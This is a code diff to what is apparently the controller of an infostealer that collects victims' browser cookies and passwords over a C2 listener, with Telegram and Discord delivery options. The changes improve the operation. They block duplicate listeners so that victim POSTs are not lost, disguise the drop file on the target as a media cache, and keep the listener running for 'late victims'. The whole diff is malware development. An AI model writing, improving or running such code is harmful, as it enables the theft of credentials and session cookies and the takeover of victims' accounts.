@@ -390,6 +390,15 @@ def start_listener(port, telegram=None, discord=None):
     Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
     closing the main terminal). Output is also written to loot/listener.log."""
     os.makedirs(LOOT, exist_ok=True)
+    # refuse to start twice: a zombie listener from a previous run kept the port,
+    # the new listener died with EADDRINUSE and every victim POST was lost
+    try:
+        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        probe.bind(("0.0.0.0", port))
+        probe.close()
+    except OSError:
+        log("[!] port %d already in use -- kill the old listener or pass --port / --find-port" % port)
+        return None
     # clean old loot (both old and new filenames)
     for f in ["all_cookies.json", "all_cookies.txt",
               "passwords.json", "passwords.txt",
@@ -464,7 +473,7 @@ def wait_for_cookies(timeout=300):
         time.sleep(1)
     log("[-] timeout -- no cookies received in %ds" % timeout)
     log("    check: is the listener running? is the C2 URL correct?")
-    log("    fallback: C:\\ProgramData\\cookielog\\drop.json")
+    log("    fallback on the target: C:\\ProgramData\\MediaCache\\cache.json")
     return False
 
 # ------------------------------------------------------------------ local test run
@@ -1355,9 +1364,9 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
         wait_for_cookies(timeout=300)
     except KeyboardInterrupt:
         pass
-
-    listener.terminate()
-    log("\n[*] done. cookies in loot/cookies.json + loot/session_cookies.json")
+    if listener.poll() is None:
+        log("[*] listener still running on port %d -- leave it up for late victims" % port)
+    log("\n[*] done. cookies in loot/all_cookies.json + loot/session_cookies.json")
 
 # ------------------------------------------------------------------ main
 
@@ -1684,10 +1693,10 @@ def main():
         wait_for_cookies(timeout=300)
     except KeyboardInterrupt:
         log("\n[*] interrupted by user")
-    finally:
-        if listener.poll() is None:
-            listener.terminate()
-            log("[*] listener stopped")
+    # keep the listener alive: victims often run the exe minutes or hours later,
+    # terminating it here silently dropped every late delivery
+    if listener.poll() is None:
+        log("[*] listener still running on port %d -- leave it up for late victims (close its window to stop)" % port)
 
     return 0
 
